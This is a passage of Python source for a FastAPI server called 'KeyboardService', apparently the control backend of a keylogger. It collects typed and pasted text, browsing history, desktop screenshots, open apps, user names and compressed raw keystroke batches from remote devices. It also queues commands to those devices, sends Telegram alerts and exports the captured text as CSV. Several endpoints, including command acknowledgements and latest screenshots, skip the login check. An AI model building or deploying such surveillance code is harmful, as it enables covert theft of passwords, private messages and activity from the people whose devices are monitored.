        "battery_percent": telemetry.get("battery_percent") if telemetry.get("battery_percent") is not None else previous.get("battery_percent"),
        "battery_status": telemetry.get("battery_status") or previous.get("battery_status", "Unknown"),
        "open_apps": telemetry.get("open_apps", previous.get("open_apps", []))[:30],
    }
    if not DATABASE_URL:
        return

    with psycopg.connect(DATABASE_URL) as connection:
        with connection.cursor() as cursor:
            cursor.execute(
                """
                INSERT INTO devices (device_id, device_name, last_seen, started_at, joined_at)
                VALUES (%s, %s, %s, %s, %s)
                ON CONFLICT (device_id) DO UPDATE SET
                    device_name = EXCLUDED.device_name,
                    last_seen = EXCLUDED.last_seen,
                    started_at = EXCLUDED.started_at
                """,
                (
                    device_id,
                    device_name,
                    last_seen,
                    started_at,
                    joined_at,
                ),
            )


def write_text_log():
    line_text = "\n".join(
        f"{int(item['time'])}|{item['device_id']}|{item['device_name']}|{1 if item.get('is_pasted') else 0}|{1 if item.get('is_copied') else 0}|{item['text']}"
        for item in list(messages)
    )
    with LOG_PATH.open("w", encoding="utf-8") as f:
        f.write(line_text)


class MessageInput(BaseModel):
    message_id: int | None = None
    text: str
    raw_text: str = ""
    raw_only: bool = False
    device_id: str = "unknown"
    device_name: str = "Unknown device"
    app_name: str = "Unknown app"
    source_url: str = ""
    is_pasted: bool = False
    is_copied: bool = False
    retry: bool = False


class DeviceHeartbeat(BaseModel):
    device_id: str
    device_name: str = "Unknown device"
    started_at: int
    local_time: str = ""
    local_time_ms: int | None = None
    logged_in_user: str = ""
    battery_percent: int | None = None
    battery_status: str = "Unknown"
    open_apps: list[str] = []


class DeviceOffline(BaseModel):
    device_id: str


class ScreenshotInput(BaseModel):
    device_id: str
    screenshot_base64: str


class ScreenshotStatusInput(BaseModel):
    device_id: str
    status: str
    message: str = ""


class WebsiteHistoryInput(BaseModel):
    device_id: str
    device_name: str = "Unknown device"
    browser: str = "Unknown browser"
    url: str
    visited_at: int


class WebsiteHistoryStatusInput(BaseModel):
    device_id: str
    status: str
    message: str = ""


class RawBatchInput(BaseModel):
    batch_id: str
    device_id: str
    device_name: str = "Unknown device"
    session_id: str
    started_at: int
    ended_at: int
    event_count: int
    payload_base64: str


app = FastAPI(title="KeyboardService", lifespan=lifespan)
app.mount("/web", StaticFiles(directory=BASE_DIR / "web"), name="web")
load_text_messages()
load_devices()
load_client_site_url()


@app.middleware("http")
async def enforce_login_for_dashboard(request: Request, call_next):
    if not auth_is_enabled():
        return await call_next(request)
    protected_paths = {
        "/",
        "/messages",
        "/events",
        "/api/config",
        "/api/devices",
        "/api/website-history",
        "/api/screenshots",
        "/api/raw-history",
        "/api/activity",
        "/api/export/messages",
        "/login",
        "/logout",
    }
    path = request.url.path
    if path.startswith("/web/"):
        return await call_next(request)
    if path.startswith("/health"):
        return await call_next(request)
    if path.startswith("/api/devices/") and not path.startswith("/api/devices/website-history-status"):
        if path in {"/api/devices/heartbeat", "/api/devices/screenshot-upload", "/api/devices/screenshot-status", "/api/devices/offline"} or "/commands/" in path and path.endswith("/ack"):
            return await call_next(request)
        if path.startswith("/api/devices/") and "/screenshot" in path:
            return await call_next(request)
    if path in protected_paths or path.startswith("/api/screenshots/") or path.startswith("/api/devices/"):
        token = request.cookies.get("ks_session")
        if not validate_session_token(token):
            if path == "/login":
                return await call_next(request)
            return RedirectResponse(url="/login", status_code=302)
    return await call_next(request)


@app.get("/login")
async def login_page():
    return Response(login_page_html(), media_type="text/html")


@app.post("/login")
async def login_submit(request: Request):
    if not auth_is_enabled():
        return RedirectResponse(url="/", status_code=302)
    form = await request.form()
    username = str(form.get("username", "")).strip()
    password = str(form.get("password", "")).strip()
    if username == APP_USERNAME and password == APP_PASSWORD:
        response = RedirectResponse(url="/", status_code=302)
        response.set_cookie(key="ks_session", value=make_session_token(username), httponly=True, samesite="lax", max_age=60 * 60 * 12)
        return response
    return Response(login_page_html("Invalid username or password."), media_type="text/html")


@app.get("/logout")
async def logout():
    response = RedirectResponse(url="/login", status_code=302)
    response.delete_cookie("ks_session")
    return response


@app.get("/")
async def root(request: Request):
    token = request.cookies.get("ks_session")
    if auth_is_enabled() and not validate_session_token(token):
        return RedirectResponse(url="/login", status_code=302)
    return FileResponse(HTML_PATH)


@app.get("/messages")
async def fetch_messages(device_id: str | None = None):
    selected_device_id = (device_id or "").strip()
    result = [
        item for item in messages
        if not selected_device_id or str(item.get("device_id")) == selected_device_id
    ]
    return JSONResponse(result)


@app.get("/api/website-history")
async def fetch_website_history(device_id: str | None = None):
    selected_device_id = (device_id or "").strip()
    cutoff = int(time.time() * 1000) - WEBSITE_HISTORY_MAX_AGE_MS
    if DATABASE_URL:
        try:
            with psycopg.connect(DATABASE_URL) as connection:
                with connection.cursor() as cursor:
                    cursor.execute(
                        "DELETE FROM website_history WHERE visited_at < %s",
                        (cutoff,),
                    )
                    query = """
                        SELECT id, device_id, device_name, browser, url, visited_at
                        FROM website_history
                    """
                    values = [cutoff]
                    query += " WHERE visited_at >= %s"
                    if selected_device_id:
                        query += " AND device_id = %s"
                        values.append(selected_device_id)
                    query += " ORDER BY visited_at DESC LIMIT 500"
                    cursor.execute(query, values)
                    rows = cursor.fetchall()
            return JSONResponse([
                {
                    "id": row[0], "device_id": row[1], "device_name": row[2],
                    "browser": row[3], "url": row[4], "visited_at": row[5],
                }
                for row in rows
            ])
        except Exception as error:
            print(f"Could not load website history: {error}")
            return JSONResponse({"ok": False, "error": "website history unavailable"}, status_code=503)
    return JSONResponse([
        item for item in reversed(website_history)
        if item["visited_at"] >= cutoff
        and (not selected_device_id or item["device_id"] == selected_device_id)
    ])


@app.post("/api/website-history")
async def add_website_history(
    payload: WebsiteHistoryInput, x_api_key: str | None = Header(default=None)
):
    expected_key = os.getenv("INGEST_API_KEY")
    if expected_key and x_api_key != expected_key:
        return JSONResponse({"ok": False, "error": "unauthorized"}, status_code=401)
    device_id = payload.device_id.strip()
    url = payload.url.strip()
    cutoff = int(time.time() * 1000) - WEBSITE_HISTORY_MAX_AGE_MS
    if (
        not device_id
        or not url.startswith(("http://", "https://"))
        or payload.visited_at < cutoff
    ):
        return JSONResponse({"ok": False, "error": "invalid website history"}, status_code=400)
    item = {
        "id": int(time.time() * 1000),
        "device_id": device_id,
        "device_name": payload.device_name.strip() or "Unknown device",
        "browser": payload.browser.strip() or "Unknown browser",
        "url": url,
        "visited_at": payload.visited_at,
    }
    try:
        if DATABASE_URL:
            with psycopg.connect(DATABASE_URL) as connection:
                with connection.cursor() as cursor:
                    cursor.execute(
                        """
                        INSERT INTO website_history
                            (device_id, device_name, browser, url, visited_at)
                        VALUES (%s, %s, %s, %s, %s)
                        """,
                        (item["device_id"], item["device_name"], item["browser"], item["url"], item["visited_at"]),
                    )
        else:
            website_history.append(item)
    except Exception as error:
        print(f"Could not save website history: {error}")
        return JSONResponse({"ok": False, "error": "website history storage unavailable"}, status_code=503)
    return JSONResponse({"ok": True})


@app.post("/api/devices/website-history-status")
async def update_website_history_status(
    payload: WebsiteHistoryStatusInput, x_api_key: str | None = Header(default=None)
):
    expected_key = os.getenv("INGEST_API_KEY")
    if expected_key and x_api_key != expected_key:
        return JSONResponse({"ok": False, "error": "unauthorized"}, status_code=401)
    device_id = payload.device_id.strip()
    if device_id not in devices:
        return JSONResponse({"ok": False, "error": "device not found"}, status_code=404)
    website_history_statuses[device_id] = {
        "status": payload.status.strip() or "Failed",
        "message": payload.message.strip(),
    }
    return JSONResponse({"ok": True})


@app.get("/api/config")
async def fetch_config():
    return JSONResponse({
        "buy_me_a_coffee_url": BUY_ME_A_COFFEE_URL if not SUPPORT_METHODS else "",
        "payment_methods": SUPPORT_METHODS,
    })


@app.get("/api/devices")
async def fetch_devices():
    now = int(time.time() * 1000)
    for device_id, status in list(screenshot_statuses.items()):
        if status.get("status") in ("Requested", "Taking screenshot", "Capturing", "Uploading"):
            age = (now - int(status.get("updated_at", now))) / 1000
            if age > SCREENSHOT_STATUS_TIMEOUT:
                screenshot_statuses[device_id] = {
                    "status": "Failed",
                    "message": "The client did not finish within 90 seconds.",
                    "updated_at": now,
                }
    screenshot_devices = set()
    if DATABASE_URL:
        try:
            with psycopg.connect(DATABASE_URL) as connection:
                with connection.cursor() as cursor:
                    cursor.execute(
                        "SELECT DISTINCT ON (device_id) device_id FROM screenshots ORDER BY device_id, captured_at DESC"
                    )
                    screenshot_devices = {str(row[0]) for row in cursor.fetchall()}
        except Exception as error:
            error_text = str(error)
            if "does not exist" in error_text or "relation \"screenshots\"" in error_text:
                print(f"Screenshots table not ready yet: {error}")
            else:
                print(f"Could not load screenshot list: {error}")
    result = []
    for device in devices.values():
        device_time_ms = device.get("local_time_ms")
        if not isinstance(device_time_ms, (int, float)) or device_time_ms < 100000000000:
            device_time_ms = None
        last_seen = int(device.get("last_seen", 0))
        started_at = int(device.get("started_at", last_seen))
        age_seconds = max(0, (now - last_seen) // 1000)
        online = device_online_states.get(
            str(device["id"]), age_seconds <= DEVICE_OFFLINE_AFTER
        )
        uptime_end = now if online else last_seen
        result.append(
            {
                **device,
                "online": online,
                "status": "Online" if online else "Offline",
                "last_seen_age_seconds": age_seconds,
                "offline_after_seconds": DEVICE_OFFLINE_AFTER,
                "uptime_seconds": max(0, (uptime_end - started_at) // 1000),
                "local_time_ms": device_time_ms,
                "screenshot_url": (
                    f"/api/devices/{device['id']}/screenshot/latest"
                    if str(device["id"]) in screenshot_devices
                    else ""
                ),
                "screenshot_status": screenshot_statuses.get(str(device["id"]), {}).get("status", "Ready"),
                "screenshot_message": screenshot_statuses.get(str(device["id"]), {}).get("message", ""),
                "website_history_status": website_history_statuses.get(str(device["id"]), {}).get("status", "Ready"),
                "website_history_message": website_history_statuses.get(str(device["id"]), {}).get("message", ""),
            }
        )
    return JSONResponse(result)


@app.get("/api/devices/{device_id}/detail")
async def fetch_device_detail(device_id: str):
    normalized_device_id = device_id.strip()
    device = devices.get(normalized_device_id)
    if not device:
        return JSONResponse({"ok": False, "error": "device not found"}, status_code=404)
    recent_messages = [item for item in messages if str(item.get("device_id")) == normalized_device_id][-50:]
    recent_sites = [item for item in reversed(website_history) if item.get("device_id") == normalized_device_id][:50]
    now = int(time.time() * 1000)
    last_seen = int(device.get("last_seen", 0))
    device_summary = {
        **device,
        "online": device_online_states.get(normalized_device_id, now - last_seen <= DEVICE_OFFLINE_AFTER * 1000),
        "last_seen_age_seconds": max(0, (now - last_seen) // 1000),
        "commands": list_device_commands(normalized_device_id),
    }
    return JSONResponse({
        "device": device_summary,
        "messages": recent_messages,
        "website_history": recent_sites,
        "commands": device_summary["commands"],
    })


@app.get("/api/activity")
async def fetch_activity(device_id: str | None = None):
    selected = (device_id or "").strip()
    selected_messages = [item for item in messages if not selected or str(item.get("device_id")) == selected]
    selected_sites = [item for item in website_history if not selected or item.get("device_id") == selected]
    apps = {}
    domains = {}
    for item in selected_messages:
        app_name = str(item.get("app_name") or "Unknown app")
        apps[app_name] = apps.get(app_name, 0) + 1
    for item in selected_sites:
        domain = urllib.parse.urlparse(str(item.get("url", ""))).netloc
        if domain:
            domains[domain] = domains.get(domain, 0) + 1
    return JSONResponse({
        "messages": len(selected_messages),
        "website_visits": len(selected_sites),
        "raw_events": 0,
        "top_apps": sorted(apps.items(), key=lambda item: item[1], reverse=True)[:10],
        "top_domains": sorted(domains.items(), key=lambda item: item[1], reverse=True)[:10],
        "recent_messages": selected_messages[-20:],
        "recent_websites": list(reversed(selected_sites[-20:])),
    })


@app.get("/api/export/messages")
async def export_messages(device_id: str | None = None, format: str = "csv"):
    selected = (device_id or "").strip()
    items = [item for item in messages if not selected or str(item.get("device_id")) == selected]
    audit_event("messages_exported", device_id=selected, details={"format": format, "count": len(items)})
    if format.lower() == "json":
        return JSONResponse(items)
    output = io.StringIO()
    writer = csv.DictWriter(output, fieldnames=["id", "time", "device_id", "device_name", "app_name", "text", "source_url"])
    writer.writeheader()
    for item in items:
        writer.writerow({field: item.get(field, "") for field in writer.fieldnames})
    return Response(output.getvalue(), media_type="text/csv", headers={"Content-Disposition": "attachment; filename=keyboardservice-messages.csv"})


@app.get("/api/screenshots")
async def fetch_screenshots(device_id: str | None = None):
    if not DATABASE_URL:
        return JSONResponse([])
    try:
        with psycopg.connect(DATABASE_URL) as connection:
            with connection.cursor() as cursor:
                query = """
                    SELECT screenshots.id, screenshots.device_id, screenshots.captured_at,
                           screenshots.storage_path, devices.device_name
                    FROM screenshots
                    LEFT JOIN devices ON devices.device_id = screenshots.device_id
                """
                values = []
                if device_id and device_id.strip():
                    query += " WHERE screenshots.device_id = %s"
                    values.append(device_id.strip())
                query += " ORDER BY screenshots.captured_at DESC LIMIT %s"
                values.append(SCREENSHOT_LIST_LIMIT)
                cursor.execute(query, values)
                rows = cursor.fetchall()
        return JSONResponse([
            {
                "id": row[0],
                "device_id": row[1],
                "captured_at": row[2],
                "device_name": row[4] or "Unknown device",
                "image_url": f"/api/screenshots/{row[0]}/image",
            }
            for row in rows
        ])
    except Exception as error:
        error_text = str(error)
        if "does not exist" in error_text or "relation \"screenshots\"" in error_text:
            print(f"Screenshots table not ready yet: {error}")
            return JSONResponse([])
        print(f"Could not load screenshots: {error}")
        return JSONResponse({"ok": False, "error": "screenshots unavailable"}, status_code=503)


@app.get("/api/screenshots/{screenshot_id}/image")
async def fetch_screenshot_image(screenshot_id: int):
    if not DATABASE_URL or not SUPABASE_URL or not SUPABASE_SERVICE_ROLE_KEY:
        return JSONResponse({"ok": False, "error": "screenshot storage unavailable"}, status_code=503)
    try:
        image_bytes = await asyncio.to_thread(read_screenshot_image, screenshot_id)
        if image_bytes is None:
            return JSONResponse({"ok": False, "error": "screenshot not found"}, status_code=404)
        return Response(image_bytes, media_type="image/jpeg", headers={"Cache-Control": "public, max-age=300"})
    except (HTTPError, urllib.error.URLError, TimeoutError, psycopg.Error) as error:
        detail = ""
        if isinstance(error, HTTPError):
            detail = error.read().decode("utf-8", errors="replace")[:240]
        print(f"Could not load screenshot image: {error}{f' - {detail}' if detail else ''}")
        return JSONResponse({"ok": False, "error": "screenshot unavailable"}, status_code=503)


def read_screenshot_image(screenshot_id):
    with psycopg.connect(DATABASE_URL) as connection:
        with connection.cursor() as cursor:
            cursor.execute(
                "SELECT storage_path FROM screenshots WHERE id = %s",
                (screenshot_id,),
            )
            row = cursor.fetchone()
    if not row:
        return None
    storage_path = urllib.parse.quote(str(row[0]).lstrip("/"), safe="/")
    storage_request = urllib.request.Request(
        f"{SUPABASE_URL}/storage/v1/object/authenticated/{SCREENSHOT_BUCKET}/{storage_path}",
        headers={
            "Authorization": f"Bearer {SUPABASE_SERVICE_ROLE_KEY}",
            "apikey": SUPABASE_SERVICE_ROLE_KEY,
        },
    )
    with urllib.request.urlopen(storage_request, timeout=30) as response:
        return response.read()


@app.post("/api/devices/heartbeat")
async def device_heartbeat(
    payload: DeviceHeartbeat, x_api_key: str | None = Header(default=None)
):
    expected_key = os.getenv("INGEST_API_KEY")
    if expected_key and x_api_key != expected_key:
        return JSONResponse({"ok": False, "error": "unauthorized"}, status_code=401)

    device_id = payload.device_id.strip()
    device_name = payload.device_name.strip() or "Unknown device"
    if not device_id:
        return JSONResponse({"ok": False, "error": "missing device_id"}, status_code=400)

    now = int(time.time() * 1000)
    existing_device = devices.get(device_id, {})
    joined_at = int(existing_device.get("joined_at", now))
    was_online = device_online_states.get(device_id)
    if was_online is None and device_id in devices:
        was_online = now - int(devices[device_id].get("last_seen", 0)) <= (
            DEVICE_OFFLINE_AFTER * 1000
        )
    try:
        save_device(
            device_id,
            device_name,
            now,
            payload.started_at,
            joined_at,
            {
                "local_time": payload.local_time,
                "local_time_ms": payload.local_time_ms,
                "logged_in_user": payload.logged_in_user,
                "battery_percent": payload.battery_percent,
                "battery_status": payload.battery_status,
                "open_apps": payload.open_apps,
            },
        )
    except Exception as error:
        print(f"Could not save device heartbeat: {error}")
        return JSONResponse(
            {"ok": False, "error": "device storage unavailable"}, status_code=503
        )
    device_online_states[device_id] = True
    devices[device_id].update(
        {
            "local_time": payload.local_time,
            "logged_in_user": payload.logged_in_user or "Unknown user",
            "battery_percent": payload.battery_percent,
            "battery_status": payload.battery_status or "Unknown",
        }
    )
    if was_online is not True:
        await asyncio.to_thread(
            notify_device_status, device_id, device_name, True
        )
    screenshot_requested = screenshot_requests.pop(device_id, None) is not None
    if screenshot_requested:
        screenshot_statuses[device_id] = {
            "status": "Taking screenshot",
            "message": "The client is capturing the desktop.",
            "updated_at": now,
        }
    command = claim_device_command(device_id)
    response = {
        "ok": True,
        "screenshot_requested": screenshot_requested,
        "command": command.get("command") if command else None,
        "command_id": command.get("command_id") if command else None,
    }
    if valid_site_url(CLIENT_SITE_URL):
        response["client_site_url"] = CLIENT_SITE_URL
    return JSONResponse(response)


@app.post("/api/devices/{device_id}/screenshot")
async def request_device_screenshot(
    device_id: str, x_api_key: str | None = Header(default=None)
):
    expected_key = os.getenv("INGEST_API_KEY")
    if expected_key and x_api_key != expected_key:
        return JSONResponse({"ok": False, "error": "unauthorized"}, status_code=401)
    normalized_device_id = device_id.strip()
    if not normalized_device_id or normalized_device_id not in devices:
        return JSONResponse({"ok": False, "error": "device not found"}, status_code=404)
    screenshot_requests[normalized_device_id] = int(time.time() * 1000)
    screenshot_statuses[normalized_device_id] = {
        "status": "Requested",
        "message": "Waiting for the client to poll the screenshot request.",
        "updated_at": int(time.time() * 1000),
    }
    return JSONResponse({"ok": True})


@app.post("/api/devices/{device_id}/command")
async def request_device_command(
    device_id: str, request: Request, x_api_key: str | None = Header(default=None)
):
    expected_key = os.getenv("INGEST_API_KEY")
    if expected_key and x_api_key != expected_key:
        return JSONResponse({"ok": False, "error": "unauthorized"}, status_code=401)
    payload = await request.json()
    command = str(payload.get("command", "")).strip().lower()
    succeeded, result = queue_device_command(device_id, command)
    if not succeeded:
        status_code = 400 if "Unsupported" in result else 404
        return JSONResponse({"ok": False, "error": result.lower()}, status_code=status_code)
    return JSONResponse({"ok": True, "command_id": result})


@app.get("/api/devices/{device_id}/commands")
async def fetch_device_commands(device_id: str, limit: int = 50):
    normalized_device_id = device_id.strip()
    if normalized_device_id not in devices:
        return JSONResponse({"ok": False, "error": "device not found"}, status_code=404)
    return JSONResponse(list_device_commands(normalized_device_id, limit))


@app.post("/api/devices/{device_id}/commands/{command_id}/ack")
async def acknowledge_device_command(device_id: str, command_id: str, request: Request):
    payload = await request.json()
    status = str(payload.get("status", "failed")).strip().lower()
    error = str(payload.get("error", "")).strip()
    if status not in {"completed", "failed"}:
        return JSONResponse({"ok": False, "error": "unsupported status"}, status_code=400)
    completed_at = int(time.time() * 1000)
    updated = False
    if DATABASE_URL:
        try:
            with psycopg.connect(DATABASE_URL) as connection:
                with connection.cursor() as cursor:
                    cursor.execute(
                        "UPDATE device_commands SET status = %s, completed_at = %s, error = %s WHERE command_id = %s AND device_id = %s",
                        (status, completed_at, error, command_id, device_id.strip()),
                    )
                    updated = cursor.rowcount > 0
        except Exception as db_error:
            print(f"Could not acknowledge device command: {db_error}")
    record = device_command_records.get(command_id)
    if record and record["device_id"] == device_id.strip():
        record.update({"status": status, "completed_at": completed_at, "error": error})
        updated = True
    if not updated:
        return JSONResponse({"ok": False, "error": "command not found"}, status_code=404)
    audit_event("device_command_acknowledged", device_id=device_id, details={"command_id": command_id, "status": status, "error": error})
    return JSONResponse({"ok": True})


@app.get("/api/devices/{device_id}/screenshot-request")
async def poll_device_screenshot_request(
    device_id: str, x_api_key: str | None = Header(default=None)
):
    expected_key = os.getenv("INGEST_API_KEY")
    if expected_key and x_api_key != expected_key:
        return JSONResponse({"ok": False, "error": "unauthorized"}, status_code=401)
    normalized_device_id = device_id.strip()
    if not normalized_device_id or normalized_device_id not in devices:
        return JSONResponse({"ok": False, "error": "device not found"}, status_code=404)
    now = int(time.time() * 1000)
    screenshot_requested = screenshot_requests.pop(normalized_device_id, None) is not None
    if screenshot_requested:
        screenshot_statuses[normalized_device_id] = {
            "status": "Taking screenshot",
            "message": "The client is capturing the desktop.",
            "updated_at": now,
        }
    command = claim_device_command(normalized_device_id)
    return JSONResponse({
        "ok": True,
        "screenshot_requested": screenshot_requested,
        "command": command.get("command") if command else None,
        "command_id": command.get("command_id") if command else None,
    })


@app.post("/api/devices/screenshot-upload")
async def upload_device_screenshot(
    payload: ScreenshotInput, x_api_key: str | None = Header(default=None)
):
    expected_key = os.getenv("INGEST_API_KEY")
    if expected_key and x_api_key != expected_key:
        return JSONResponse({"ok": False, "error": "unauthorized"}, status_code=401)
    device_id = payload.device_id.strip()
    screenshot_base64 = payload.screenshot_base64.strip()
    if not device_id or not screenshot_base64:
        screenshot_statuses[device_id] = {"status": "Failed", "message": "The client sent an empty screenshot.", "updated_at": int(time.time() * 1000)}
        return JSONResponse({"ok": False, "error": "invalid screenshot"}, status_code=400)
    if device_id not in devices:
        return JSONResponse({"ok": False, "error": "device not found"}, status_code=404)
    if not DATABASE_URL or not SUPABASE_URL or not SUPABASE_SERVICE_ROLE_KEY:
        screenshot_statuses[device_id] = {"status": "Failed", "message": "Storage configuration is missing on the server.", "updated_at": int(time.time() * 1000)}
        return JSONResponse({"ok": False, "error": "screenshot storage unavailable"}, status_code=503)
    try:
        await asyncio.to_thread(save_screenshot, device_id, screenshot_base64)
    except (ValueError, urllib.error.URLError, TimeoutError, RuntimeError, psycopg.Error) as error:
        print(f"Could not save device screenshot: {error}")
        error_text = str(error)
        if isinstance(error, psycopg.Error):
            error_text = "Database error while recording screenshot metadata."
        screenshot_statuses[device_id] = {
            "status": "Failed",
            "message": error_text[:240] or "The screenshot could not be saved.",
            "updated_at": int(time.time() * 1000),
        }
        return JSONResponse({"ok": False, "error": "screenshot storage unavailable"}, status_code=503)
    screenshot_statuses[device_id] = {
        "status": "Saved",
        "message": "Screenshot saved successfully.",
        "updated_at": int(time.time() * 1000),
    }
    return JSONResponse({"ok": True})


def save_screenshot(device_id, screenshot_base64):
    image_bytes = base64.b64decode(screenshot_base64, validate=True)
    captured_at = int(time.time() * 1000)
    storage_path = f"{device_id}/{captured_at}.jpg"
    storage_request = urllib.request.Request(
        f"{SUPABASE_URL}/storage/v1/object/{SCREENSHOT_BUCKET}/{storage_path}",
        data=image_bytes,
        headers={
            "Authorization": f"Bearer {SUPABASE_SERVICE_ROLE_KEY}",
            "apikey": SUPABASE_SERVICE_ROLE_KEY,
            "Content-Type": "image/jpeg",
            "x-upsert": "false",
        },
        method="POST",
    )
    try:
        with urllib.request.urlopen(storage_request, timeout=30) as response:
            if response.status >= 400:
                raise RuntimeError(f"Storage HTTP {response.status}")
    except HTTPError as error:
        detail = error.read().decode("utf-8", errors="replace")[:240]
        raise RuntimeError(f"Storage HTTP {error.code}: {detail}") from error
    with psycopg.connect(DATABASE_URL) as connection:
        with connection.cursor() as cursor:
            cursor.execute(
                "INSERT INTO screenshots (device_id, captured_at, storage_path) VALUES (%s, %s, %s)",
                (device_id, captured_at, storage_path),
            )


@app.post("/api/devices/screenshot-status")
async def update_screenshot_status(
    payload: ScreenshotStatusInput, x_api_key: str | None = Header(default=None)
):
    expected_key = os.getenv("INGEST_API_KEY")
    if expected_key and x_api_key != expected_key:
        return JSONResponse({"ok": False, "error": "unauthorized"}, status_code=401)
    device_id = payload.device_id.strip()
    if device_id not in devices:
        return JSONResponse({"ok": False, "error": "device not found"}, status_code=404)
    screenshot_statuses[device_id] = {
        "status": payload.status.strip() or "Failed",
        "message": payload.message.strip(),
        "updated_at": int(time.time() * 1000),
    }
    return JSONResponse({"ok": True})


@app.get("/api/devices/{device_id}/screenshot/latest")
async def fetch_latest_device_screenshot(device_id: str):
    if not DATABASE_URL or not SUPABASE_URL or not SUPABASE_SERVICE_ROLE_KEY:
        return JSONResponse({"ok": False, "error": "screenshot storage unavailable"}, status_code=503)
    try:
        image_bytes = await asyncio.to_thread(read_latest_screenshot_image, device_id.strip())
        if image_bytes is None:
            return JSONResponse({"ok": False, "error": "screenshot not found"}, status_code=404)
        return Response(image_bytes, media_type="image/jpeg", headers={"Cache-Control": "public, max-age=300"})
    except (HTTPError, urllib.error.URLError, TimeoutError, psycopg.Error) as error:
        print(f"Could not load device screenshot: {error}")
        return JSONResponse({"ok": False, "error": "screenshot unavailable"}, status_code=503)


def read_latest_screenshot_image(device_id):
    with psycopg.connect(DATABASE_URL) as connection:
        with connection.cursor() as cursor:
            cursor.execute(
                "SELECT storage_path FROM screenshots WHERE device_id = %s ORDER BY captured_at DESC LIMIT 1",
                (device_id,),
            )
            row = cursor.fetchone()
    if not row:
        return None
    storage_path = urllib.parse.quote(str(row[0]).lstrip("/"), safe="/")
    storage_request = urllib.request.Request(
        f"{SUPABASE_URL}/storage/v1/object/authenticated/{SCREENSHOT_BUCKET}/{storage_path}",
        headers={
            "Authorization": f"Bearer {SUPABASE_SERVICE_ROLE_KEY}",
            "apikey": SUPABASE_SERVICE_ROLE_KEY,
        },
    )
    with urllib.request.urlopen(storage_request, timeout=30) as response:
        return response.read()


@app.post("/api/devices/offline")
async def device_offline(
    payload: DeviceOffline, x_api_key: str | None = Header(default=None)
):
    expected_key = os.getenv("INGEST_API_KEY")
    if expected_key and x_api_key != expected_key:
        return JSONResponse({"ok": False, "error": "unauthorized"}, status_code=401)

    device_id = payload.device_id.strip()
    if not device_id:
        return JSONResponse({"ok": False, "error": "missing device_id"}, status_code=400)
    if device_id in devices:
        was_online = device_online_states.get(device_id, True)
        device_online_states[device_id] = False
        if was_online:
            await asyncio.to_thread(
                notify_device_status,
                device_id,
                devices[device_id].get("name", "Unknown device"),
                False,
            )
    return JSONResponse({"ok": True})


@app.post("/api/messages")
async def add_message(payload: MessageInput, x_api_key: str | None = Header(default=None)):
    expected_key = os.getenv("INGEST_API_KEY")
    if expected_key and x_api_key != expected_key:
        return JSONResponse({"ok": False, "error": "unauthorized"}, status_code=401)
    if payload.raw_only:
        return JSONResponse({"ok": True, "ignored": True})

    text = payload.text.strip()
    if not text:
        return JSONResponse({"ok": False, "error": "empty message"})

    now = int(time.time() * 1000)
    device_id = payload.device_id.strip() or "unknown"
    device_name = payload.device_name.strip() or "Unknown device"
    app_name = payload.app_name.strip() or "Unknown app"
    source_url = payload.source_url.strip()
    is_pasted = payload.is_pasted
    is_copied = payload.is_copied
    raw_text = payload.raw_text.strip() or text
    previous_device = devices.get(device_id, {})
    devices[device_id] = {
        "id": device_id,
        "name": device_name,
        "last_seen": now,
        "started_at": previous_device.get("started_at", now),
        "joined_at": previous_device.get("joined_at", now),
    }
    device_online_states[device_id] = True
    item = {
        "id": now,
        "text": text,
        "raw_text": raw_text,
        "raw_only": False,
        "time": now,
        "device_id": device_id,
        "device_name": device_name,
        "app_name": app_name,
        "source_url": source_url,
        "is_pasted": is_pasted,
        "is_copied": is_copied,
    }
    try:
        inserted = save_message(item)
    except Exception as error:
        print(f"Could not save message: {error}")
        return JSONResponse(
            {"ok": False, "error": "message storage unavailable"}, status_code=503
        )
    if not inserted:
        return JSONResponse({"ok": True, "duplicate": True})
    if payload.retry:
        await asyncio.to_thread(
            send_telegram_message,
            telegram_panel(
                "SYNC // OFFLINE UPLOAD",
                "📨 Message received from offline queue.\n"
                f"DEVICE: <b>{html.escape(device_name)}</b>\n"
                f"ID: <code>{html.escape(device_id)}</code>",
            ),
        )
    messages.append(item)
    return JSONResponse({"ok": True, "message": item})


@app.post("/api/raw-batches")
async def add_raw_batch(
    payload: RawBatchInput, x_api_key: str | None = Header(default=None)
):
    expected_key = os.getenv("INGEST_API_KEY")
    if expected_key and x_api_key != expected_key:
        return JSONResponse({"ok": False, "error": "unauthorized"}, status_code=401)
    if not DATABASE_URL:
        return JSONResponse({"ok": False, "error": "raw storage unavailable"}, status_code=503)
    if not payload.batch_id.strip() or not payload.device_id.strip() or payload.event_count < 1:
        return JSONResponse({"ok": False, "error": "invalid raw batch"}, status_code=400)
    try:
        decoded = gzip.decompress(base64.b64decode(payload.payload_base64))
        events = json.loads(decoded.decode("utf-8"))
        if not isinstance(events, list) or len(events) != payload.event_count:
            return JSONResponse({"ok": False, "error": "invalid raw payload"}, status_code=400)
    except (ValueError, OSError, json.JSONDecodeError):
        return JSONResponse({"ok": False, "error": "invalid raw payload"}, status_code=400)
    try:
        with psycopg.connect(DATABASE_URL) as connection:
            with connection.cursor() as cursor:
                cursor.execute(
                    """
                    INSERT INTO raw_batches
                    (batch_id, device_id, device_name, session_id, started_at, ended_at, event_count, payload_base64)
                    VALUES (%s, %s, %s, %s, %s, %s, %s, %s)
                    ON CONFLICT (batch_id) DO NOTHING
                    """,
                    (
                        payload.batch_id.strip(), payload.device_id.strip(),
                        payload.device_name.strip() or "Unknown device", payload.session_id.strip(),
                        payload.started_at, payload.ended_at, payload.event_count,
                        payload.payload_base64,
                    ),
                )
    except Exception as error:
        print(f"Could not save raw batch: {error}")
        return JSONResponse({"ok": False, "error": "raw storage unavailable"}, status_code=503)
    return JSONResponse({"ok": True})


@app.get("/api/raw-history")
async def raw_history(
    device_id: str | None = None,
    session_id: str | None = None,
    start_time: int | None = None,
    end_time: int | None = None,
    limit: int = 100,
):
    if not DATABASE_URL:
        return JSONResponse([])
    limit = min(max(limit, 1), 500)
    clauses = []
    values = []
    if device_id and device_id.strip():
        clauses.append("device_id = %s")
        values.append(device_id.strip())
    if session_id and session_id.strip():
        clauses.append("session_id = %s")
        values.append(session_id.strip())
    if start_time is not None:
        clauses.append("ended_at >= %s")
        values.append(start_time)
    if end_time is not None:
        clauses.append("started_at <= %s")
        values.append(end_time)
    where = f"WHERE {' AND '.join(clauses)}" if clauses else ""
    try:
        with psycopg.connect(DATABASE_URL) as connection:
            with connection.cursor() as cursor:
                cursor.execute(
                    f"""
                    SELECT batch_id, device_id, device_name, session_id, started_at, ended_at,
                           event_count, payload_base64
                    FROM raw_batches {where}
